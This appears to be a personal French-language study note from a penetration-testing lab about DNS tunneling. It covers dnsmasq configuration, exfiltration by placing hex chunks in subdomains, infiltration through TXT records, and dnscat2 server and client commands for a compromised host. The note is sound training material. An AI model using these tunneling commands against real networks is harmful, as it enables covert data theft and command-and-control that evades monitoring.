![[Pasted image 20240118094709.png]]
dnsmasq pour créer un DNS simplement.
zones définies pas auth-zone et auth-server dans dnsmasq.conf
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# Lancer dnsmaskq
sudo dnsmasq -C dnsmasq.conf -d
#DNS du client:
resolvectl status
#Flush cache:
resolvectl flush-caches
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![[Pasted image 20240118095351.png]]
The steps where MULTISERVER03 sent queries to the root name serversand TLD name server have been omitted here for simplicity. But in anormal network situation, these steps would precede the request madeto FELINEAUTHORITY.

# Exfiltration
Pourrait écrire de petites données dans le format  ```[hex-string-chunk].feline.corp ```

# Infiltration
Utiliser TXT record

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vérification client:
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server:		192.168.50.64
Address:	192.168.50.64#53

Non-authoritative answer:
www.feline.corp	text = "here's something useful!"
www.feline.corp	text = "here's something else less useful."

Authoritative answers can be found from:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


 # dnscat2
 Permet d'extraire et d'infiltrer des données avec un client sur une machine compromise
 serveur:```dnscat2-server feline.corp```
 client doit avoir l'application client 
```./dnscat feline.corp```

 utiliser **windows** pour voir les sessions et ```window -i``` pour l'utiliser
 peut faire un port forward avec **listen**
 


